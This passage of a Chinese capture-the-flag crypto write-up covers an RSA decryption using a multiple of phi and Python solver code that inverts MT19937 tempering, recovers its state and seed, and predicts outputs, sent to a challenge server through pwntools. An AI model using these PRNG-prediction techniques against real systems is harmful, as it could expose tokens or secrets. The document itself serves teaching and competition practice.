class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><msub><mi>a</mi><mn>2</mn></msub><msub><mi>x</mi><mn>2</mn></msub></msup><mo>=</mo><msup><msub><mi>a</mi><mn>1</mn></msub><mrow><mi>b</mi><mo>∗</mo><msub><mi>x</mi><mn>2</mn></msub></mrow></msup><mo>=</mo><msub><mi>c</mi><mn>1</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">{a_2}^{x_2}={a_1}^{b*x_2}=c_1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8144em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9991em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>显然此时有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><mi>b</mi><mo>∗</mo><msub><mi>x</mi><mn>2</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">x_1=b*x_2\mod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span></span></span></span>，（欧拉定理、或该循环群的阶为phi)</p><p>此时可以得到phi的一个倍数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>p</mi><mi>h</mi><mi>i</mi><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><mi>b</mi><mo>∗</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">kphi=x_1-b*x_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>k</mi><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">d=e^{-1}\mod{kphi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span></span></span></span>  (用phi的倍数求私钥与phi等价，可由欧拉定理得)</p><p>然后解rsa即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a1=<span class="hljs-number">21606807968454766520529084107175158062623274703294799705984925156349373997035743632649715867216648159433730630939058861636582120303338699113498645592338621228070481894445156769437351313971471061779425442129487317917630554305634797690296919992201174927956121524640438775183413288101169580705360562693274958339417</span><br>b1=<span class="hljs-number">68789042322037899901399142739922213531190892214327212247633649397602243027562329029767224931385807659445647908974735092145336602662873465734923450809783198772444106655438821950560058413359621316189435942839212247873870560114926459781136160541556773230183543715576244986800296759341282346581691226676298068904581</span><br>n = <span class="hljs-number">369520637995317866367336688225182965061898803879373674073832046072914710171302486913303917853881549637806426191970292829598855375370563396182543413674021955181862907847280705741114636854238746612618069619482248639049407507041667720977392421249242597197448360531895206645794505182208390084734779667749657408715621</span><br>c = <span class="hljs-number">324131338592233305486487416176106472248153652884280898177125443926549710357763331715045582842045967830200123100144721322509500306940560917086108978796500145618443920020112366546853892387011738997522207752873944151628204886591075864677988865335625452099668804529484866900390927644093597772065285222172136374562043</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>phi=a1-<span class="hljs-number">3</span>*b1<br>e=<span class="hljs-number">65537</span><br>d=invert(e,phi)<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="fake-MT、real-MT">fake_MT、real_MT</h2><p>考点：</p><ol><li>MT19937的预测、逆向，部件的逆向</li><li>pwntools自动化脚本</li></ol><p>1.可以参考<a href="https://www.anquanke.com/post/id/205861?display=mobile%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%BE%88%E7%BB%8F%E5%85%B8%EF%BC%81%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D">https://www.anquanke.com/post/id/205861?display=mobile学习，很经典！很有意思</a></p><p>2.pwntools基本用法：接发数据等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res, shift</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_values</span>(<span class="hljs-params">res, shift, mask</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res, shift</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_values</span>(<span class="hljs-params">res, shift, mask</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment">#extract_recover</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_recover</span>(<span class="hljs-params">y</span>):<br>    y = inverse_right(y, <span class="hljs-number">18</span>)<br>    y = inverse_left_values(y, <span class="hljs-number">15</span>, <span class="hljs-number">4022730752</span>)<br>    y = inverse_left_values(y, <span class="hljs-number">7</span>, <span class="hljs-number">2636928640</span>)<br>    y = inverse_right(y, <span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        tmp = state[i + <span class="hljs-number">624</span>] ^ state[i + <span class="hljs-number">397</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp &amp; high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i - <span class="hljs-number">1</span> + <span class="hljs-number">624</span>] ^ state[i + <span class="hljs-number">396</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>        res |= (tmp) &amp; low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_state</span>(<span class="hljs-params">out</span>):<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out:<br>        i = inverse_right(i, <span class="hljs-number">18</span>)<br>        i = inverse_left_values(i, <span class="hljs-number">15</span>, <span class="hljs-number">4022730752</span>)<br>        i = inverse_left_values(i, <span class="hljs-number">7</span>, <span class="hljs-number">2636928640</span>)<br>        i = inverse_right(i, <span class="hljs-number">11</span>)<br>        state.append(i)<br>    <span class="hljs-keyword">return</span> state<br><span class="hljs-comment">#逆向</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">seed</span>):<br>    mt = [<span class="hljs-number">0</span>] * <span class="hljs-number">624</span><br>    mt[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">624</span>):<br>        mt[i] = _int32(<span class="hljs-number">1812433253</span> * (mt[i - <span class="hljs-number">1</span>] ^ mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br>    <span class="hljs-keyword">return</span> mt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invert_right</span>(<span class="hljs-params">res, shift</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        res = tmp ^ res &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> _int32(res)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover</span>(<span class="hljs-params">last</span>):<br>    n = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span><br>    inv = invert(<span class="hljs-number">1812433253</span>, n)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        last = ((last - i) * inv) % n<br>        last = invert_right(last, <span class="hljs-number">30</span>)<br>    <span class="hljs-keyword">return</span> last<br><span class="hljs-comment">#逆向twist</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_1</span>(<span class="hljs-params">randoms</span>):  <span class="hljs-comment"># 预测</span><br>    rc = RandCrack()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> randoms:<br>        temp = i<br>        <span class="hljs-keyword">while</span> temp != <span class="hljs-number">0</span>:<br>            rc.submit(temp % <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>            temp &gt;&gt;= <span class="hljs-number">32</span><br>    number = rc.predict_getrandbits(<span class="hljs-number">96</span>)<br>    <span class="hljs-keyword">return</span> number<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_2</span>(<span class="hljs-params">randoms</span>):<br>    partS = recover_state(randoms)<br>    state = backtrace([<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> + partS)[:<span class="hljs-number">624</span>]<br>    prng = Random()<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    nn = prng.getrandbits(<span class="hljs-number">32</span>)<br>    number = prng.getrandbits(<span class="hljs-number">96</span>)<br>    <span class="hljs-keyword">return</span> number<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_3</span>(<span class="hljs-params">last_number</span>):<br>    seed = recover(last_number)<br>    <span class="hljs-keyword">return</span> seed<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_4</span>(<span class="hljs-params">ex_number</span>):<br>    <span class="hljs-keyword">return</span> extract_recover(ex_number)<br><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="hljs-number">30279</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>io.send(<span class="hljs-string">&#x27;1&#x27;</span>)  <span class="hljs-comment">#按任意键开始？</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Round: &quot;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    Line = io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;randoms = &#x27;</span> <span class="hljs-keyword">in</span> Line:<br>        randoms = <span class="hljs-built_in">eval</span>(Line[<span class="hljs-number">9</span>:].replace(<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))  <span class="hljs-comment">#去除L</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Guess &#x27;</span>)<br>        tag = io.recvuntil(<span class="hljs-string">&#x27; number:&#x27;</span>).decode()<br>        <span class="hljs-built_in">print</span>(tag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;after&#x27;</span> <span class="hljs-keyword">in</span> tag:<br>            io.sendline(<span class="hljs-built_in">str</span>(guess_1(randoms)))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;pre&#x27;</span> <span class="hljs-keyword">in</span> tag:<br>            io.sendline(<span class="hljs-built_in">str</span>(guess_2(randoms)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;last number = &#x27;</span> <span class="hljs-keyword">in</span> Line:<br>        last_number = <span 